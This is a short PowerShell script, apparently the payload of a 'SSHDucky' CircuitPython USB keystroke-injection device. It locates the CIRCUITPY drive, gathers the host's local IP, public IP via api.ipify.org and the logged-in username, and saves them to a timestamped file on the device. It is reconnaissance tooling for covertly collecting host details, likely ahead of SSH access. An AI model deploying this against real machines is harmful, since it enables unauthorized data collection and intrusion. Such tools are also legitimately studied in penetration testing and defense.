# Specify the volume label of your CircuitPython device
$volumeLabel = "CIRCUITPY"

# Get the drive letter of the CircuitPython device
$driveLetter = (Get-Volume | Where-Object { $_.FileSystemLabel -eq $volumeLabel }).DriveLetter

if ($driveLetter) {
    # CircuitPython device found
    $directoryPath = "$driveLetter" + ":" + "\SSHDucky\SystemData"
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $fileName = "ip_username_$timestamp.txt"
    $filePath = Join-Path -Path $directoryPath -ChildPath $fileName

    # Generate the content to be stored in the file
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Wi-Fi).IPAddress
    $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
    $content = "Local IP: $localIP"
    $content += "`nPublic IP: $publicIP"
    $content += "`nUsername: $env:USERNAME"

    # Create the directory if it doesn't exist
    if (-not (Test-Path -Path $directoryPath)) {
        New-Item -Path $directoryPath -ItemType Directory | Out-Null
    }

    # Create the file
    $content | Out-File -FilePath $filePath -Encoding ASCII

    Write-Host "File created successfully: $filePath"
}
else {
    Write-Host "CircuitPython device not found."
}
